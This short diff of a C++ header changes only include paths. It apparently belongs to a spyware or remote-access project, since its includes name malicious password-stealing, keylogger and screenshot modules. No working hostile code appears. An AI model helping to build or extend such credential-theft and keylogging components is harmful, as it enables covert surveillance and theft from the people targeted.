@@ -1,7 +1,7 @@
 #pragma once
 
-#include <Innocence.hpp>
-#include <common/Log.hpp>
+#include <common/Innocence.hpp>
+#include <log/Log.hpp>
 #include <malicious/Passwords.hpp>
 #include <malicious/Keylogger.hpp>
 #include <malicious/Screenshot.hpp>
